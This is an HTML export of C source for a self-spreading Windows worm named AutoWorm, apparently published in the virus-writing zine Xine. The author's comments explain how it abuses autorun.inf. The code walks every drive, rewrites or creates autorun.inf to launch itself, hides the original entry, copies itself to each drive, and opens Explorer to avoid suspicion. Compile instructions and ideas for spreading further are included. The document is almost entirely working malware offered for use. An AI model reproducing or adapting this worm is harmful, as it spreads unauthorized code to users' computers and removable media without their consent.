<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc2">//                                        /-----------------------------\
//                                        | Xine - issue #4 - Phile 211 |
//                                        \-----------------------------/
</span><span class="sc0">
</span><span class="sc1">/*
While making a Autorun for a cdrom I found that for
some weird reason if any drive A-Z network or not had
a autorun.inf which had a autrun open setting in it
when you explored it or click on the icon for that drive
you ran the autorun file. Ok this sound like that Mac worm
I read about for the imac So I spent some time and  this file
was born. I did my best to use no c runtime stuff so if
you know how you can recompile with only the C code need to 
run this monster.
All it does is when run first check and see if their was already
a file that should be autorun is so it runs that, then checks
all drives startting with A: - Z: for autorun.inf if found
it checks if AutoWorm is the file it should run if not
it alters the open setting to Autoworm.exe and copies the orginal 
name to a WORM open entry so it can run this file later.
If not it opens the Explorer page the user expects so as calm
any suspcious minds (like they wont notice the A: drive trying to 
run.... Ok it needs some work)

  Ideas for future version: 
    Find away to see if Drive A: has a disk in it
    or only try drive A at random times not every time...
 
Change any routines to procedures for neatness reasons
Me clean up , are you kidding :&gt;
This is it enjoy, while this worm will rapidly spread on some
systems, all you need to do is have autorun turned off for all
drives and this file is never run, but a number of systems I tested
with win98 and winnt have this option on...
Or write another virus that would alter the reg entries to 
have autorun turned on.

  compile use VC5 from MS 
cl autowomr.c Kernel32.lib /link /entry:WinMain

  yeah I know there is a neater way, and if it does not work
  try creating a win32 app workspace then add this autoworm.exe
  then compile

murkry
*/</span><span class="sc0"> 
</span><span class="sc9">#include &lt;windows.h&gt;
</span><span class="sc1">/*#include "resource.h"*/</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">VirusCopy</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nDrive</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">WinMain</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hPrevInstance</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc11">PSTR</span><span class="sc0"> </span><span class="sc11">szCmdLine</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">iCmdShow</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc10">{</span><span class="sc0">
        
        </span><span class="sc11">DWORD</span><span class="sc0">               </span><span class="sc11">dwDrives</span><span class="sc10">;</span><span class="sc0"> 
        </span><span class="sc16">char</span><span class="sc0">                </span><span class="sc11">szCurrDir</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc11">DWORD</span><span class="sc0">               </span><span class="sc11">dwSizeCurDir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0">                 </span><span class="sc11">nDrive</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc16">char</span><span class="sc0">                </span><span class="sc11">szBuff</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">+</span><span class="sc4">100</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0">                </span><span class="sc11">szFile</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">];</span><span class="sc0"> 
        

        </span><span class="sc11">HANDLE</span><span class="sc0">              </span><span class="sc11">hFind</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">//Handle for the FindFirst
</span><span class="sc0">        </span><span class="sc11">HANDLE</span><span class="sc0">              </span><span class="sc11">hFile</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">//Handle for New Files
</span><span class="sc0">        </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0">     </span><span class="sc11">fd</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">DWORD</span><span class="sc0">               </span><span class="sc11">dwWritten</span><span class="sc10">;</span><span class="sc2">//Temp Dword var
</span><span class="sc0">
 
 
    </span><span class="sc2">//First Show the people what they want to see
</span><span class="sc0">    </span><span class="sc2">//Run Explore or the orginal AutoRun file
</span><span class="sc0">        
    </span><span class="sc11">GetCurrentDirectory</span><span class="sc10">(</span><span class="sc11">dwSizeCurDir</span><span class="sc10">,(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">szCurrDir</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">lstrcat</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">szCurrDir</span><span class="sc10">,</span><span class="sc6">"autorun.inf"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">GetPrivateProfileString</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"worm"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc6">"FAIL"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">80</span><span class="sc10">,(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">szCurrDir</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0"> 

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">lstrcmpi</span><span class="sc10">(</span><span class="sc6">"FAIL"</span><span class="sc10">,(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">szFile</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">GetCurrentDirectory</span><span class="sc10">(</span><span class="sc11">dwSizeCurDir</span><span class="sc10">,(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">szCurrDir</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc11">szCurrDir</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">SW_SHOWNORMAL</span><span class="sc10">);</span><span class="sc0">         
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc11">szFile</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">SW_SHOWNORMAL</span><span class="sc10">);</span><span class="sc0">        
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc2">//Start infection routine                      
</span><span class="sc0">    
    </span><span class="sc11">dwDrives</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetLogicalDrives</span><span class="sc10">();</span><span class="sc0">
    
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nDrive</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">nDrive</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc4">32</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">nDrive</span><span class="sc10">++)</span><span class="sc0">   </span><span class="sc2">//32
</span><span class="sc0">    </span><span class="sc10">{</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dwDrives</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc11">nDrive</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
    
            </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">szBuff</span><span class="sc10">,</span><span class="sc6">"%c:\\Autorun.inf"</span><span class="sc10">,</span><span class="sc11">nDrive</span><span class="sc10">+</span><span class="sc7">'A'</span><span class="sc0">  </span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">hFind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindFirstFile</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">szBuff</span><span class="sc10">,&amp;</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
        
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hFind</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">               
    </span><span class="sc2">//          MessageBox(NULL,"File does not exists *.inf",(char*)&amp;szBuff,0);     
</span><span class="sc0">                </span><span class="sc2">//No Autorun.inf
</span><span class="sc0">                </span><span class="sc2">//Create our own AutoRun.inf
</span><span class="sc0">                </span><span class="sc2">//copy our file their as AutoWorm.exe
</span><span class="sc0">                </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">szBuff</span><span class="sc10">,</span><span class="sc11">GENERIC_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">OPEN_ALWAYS</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"[autorun]\xD\xAOPEN=AutoWorm.exe\xD\xA"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc4">30</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dwWritten</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">))</span><span class="sc0">           
                    </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//                  MessageBox(NULL,"AutoRun.Inf Created","Attempting File Copy",0);
</span><span class="sc0">                        </span><span class="sc11">VirusCopy</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">nDrive</span><span class="sc10">);</span><span class="sc0">  
                                        
                    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc2">//File Autorun.inf writen to 
</span><span class="sc0">                    
                    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//Close the File Handle Create      
</span><span class="sc0">                </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc2">//Autorun.inf created
</span><span class="sc0">    </span><span class="sc2">//              MessageBox(NULL,"AutoWorm Not found","but Probaly created",0);
</span><span class="sc0">            </span><span class="sc10">}</span><span class="sc0"> 
        
            </span><span class="sc5">else</span><span class="sc2">// AutoRun.inf Found
</span><span class="sc0">            </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//Yes Autorun.inf Read in Autorun open  check if AutoWorm.exe
</span><span class="sc0">            </span><span class="sc2">//If not write Vworm entry with value
</span><span class="sc0">            </span><span class="sc2">//Copy AutoWorm.exe
</span><span class="sc0">            </span><span class="sc2">//Change Autorun-open- AutoWorm.exe
</span><span class="sc0">    </span><span class="sc2">//          MessageBox(NULL,"File found AutoRun.inf",(char*)&amp;szBuff,0);     
</span><span class="sc0">                
                </span><span class="sc2">//Check the Autorun.inf for Virus 
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">GetPrivateProfileString</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"autorun"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc0"> 
                           </span><span class="sc6">"FAIL"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">80</span><span class="sc10">,(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">szBuff</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//          MessageBox(NULL,(char*)&amp;szFile,"AutoRun Open = ",0);
</span><span class="sc0">                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">lstrcmpi</span><span class="sc10">(</span><span class="sc6">"autoworm.exe"</span><span class="sc10">,(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">szFile</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//                  MessageBox(NULL,"We have Done it already","AutoRun",0);
</span><span class="sc0">                    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc2">//Found the AutoRun and AutoWorm
</span><span class="sc0">                    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc2">//found but not infected
</span><span class="sc0">                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc2">//Write old setting
</span><span class="sc0">                        </span><span class="sc11">WritePrivateProfileString</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"worm"</span><span class="sc10">,</span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc0"> 
                          </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">szFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">szBuff</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">WritePrivateProfileString</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"autorun"</span><span class="sc10">,</span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc0"> 
                          </span><span class="sc6">"AutoWorm.Exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">szBuff</span><span class="sc10">);</span><span class="sc0">      
                        </span><span class="sc2">//Copy our File their
</span><span class="sc0">                        </span><span class="sc11">VirusCopy</span><span class="sc10">(</span><span class="sc11">nDrive</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc2">//End Check for AutoRun
</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc2">//end check for autorun.inf
</span><span class="sc0">            
            </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hFind</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc2">//End check for Drive
</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc2">//End loop through all drives up to 32
</span><span class="sc0"> 
 
     
      </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">//Exit WinMain
</span><span class="sc0">  </span><span class="sc10">}</span><span class="sc0">

  </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">VirusCopy</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nDrive</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    
    </span><span class="sc16">char</span><span class="sc0">    </span><span class="sc11">szCurrDir</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0">    </span><span class="sc11">szBuff</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">+</span><span class="sc4">100</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0">   </span><span class="sc11">dwWritten</span><span class="sc10">;</span><span class="sc0">

 
        </span><span class="sc2">//Copy File
</span><span class="sc0">        </span><span class="sc11">dwWritten</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">GetCommandLine</span><span class="sc10">();</span><span class="sc0">
        
        </span><span class="sc11">nDrive</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nDrive</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc2">//asm code to move a string byte by by byte
</span><span class="sc0">        </span><span class="sc2">//checking for " or null chars
</span><span class="sc0">        </span><span class="sc11">_asm</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">push</span><span class="sc0">    </span><span class="sc11">esi</span><span class="sc0"> 
                    </span><span class="sc11">push</span><span class="sc0">    </span><span class="sc11">edi</span><span class="sc0">
                    </span><span class="sc11">mov</span><span class="sc0">     </span><span class="sc11">esi</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dwWritten</span><span class="sc0">
                    </span><span class="sc11">lea</span><span class="sc0">     </span><span class="sc11">edi</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dword</span><span class="sc0"> </span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc11">szCurrDir</span><span class="sc10">]</span><span class="sc0">
                    </span><span class="sc11">lodsb</span><span class="sc0"> 
                    </span><span class="sc11">cmp</span><span class="sc0">     </span><span class="sc11">al</span><span class="sc10">,</span><span class="sc7">'"'</span><span class="sc0">
                    </span><span class="sc11">je</span><span class="sc0">      </span><span class="sc11">Quotes</span><span class="sc0">
                    </span><span class="sc11">stosb</span><span class="sc0">   
            </span><span class="sc11">Quotes</span><span class="sc10">:</span><span class="sc0">
            </span><span class="sc11">NextOne</span><span class="sc10">:</span><span class="sc0">        
                    </span><span class="sc11">lodsb</span><span class="sc0">   
                    </span><span class="sc11">cmp</span><span class="sc0">     </span><span class="sc11">al</span><span class="sc10">,</span><span class="sc7">'"'</span><span class="sc0">
                    </span><span class="sc11">je</span><span class="sc0">      </span><span class="sc11">AddNull</span><span class="sc0">
                    </span><span class="sc11">stosb</span><span class="sc0">
                    </span><span class="sc11">or</span><span class="sc0">      </span><span class="sc11">al</span><span class="sc10">,</span><span class="sc11">al</span><span class="sc0">
                    </span><span class="sc11">je</span><span class="sc0">      </span><span class="sc11">EndOfStr</span><span class="sc0">
                    </span><span class="sc11">jmp</span><span class="sc0">     </span><span class="sc11">NextOne</span><span class="sc0">
            </span><span class="sc11">AddNull</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc11">xor</span><span class="sc0">     </span><span class="sc11">al</span><span class="sc10">,</span><span class="sc11">al</span><span class="sc0">
                    </span><span class="sc11">stosb</span><span class="sc0">           
            </span><span class="sc11">EndOfStr</span><span class="sc10">:</span><span class="sc0">   
                    </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">edi</span><span class="sc0">
                    </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">esi</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc2">//end asm block
</span><span class="sc0">                
        </span><span class="sc2">//szCurrDir = Current File
</span><span class="sc0">         
        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">szBuff</span><span class="sc10">,</span><span class="sc6">"%c:\\AutoWorm.Exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nDrive</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc7">'A'</span><span class="sc0">  </span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">szCurrDir</span><span class="sc10">,</span><span class="sc11">szBuff</span><span class="sc10">,</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc2">//  MessageBox(NULL,"File Copied",(char*)&amp;szBuff,0);        
</span><span class="sc0">    </span><span class="sc2">//  MessageBox(NULL,"File Copied",(char*)&amp;szCurrDir,0);     
</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc2">//End VirusCopy
</span><span class="sc0">


 
</span></div></body>
</html>
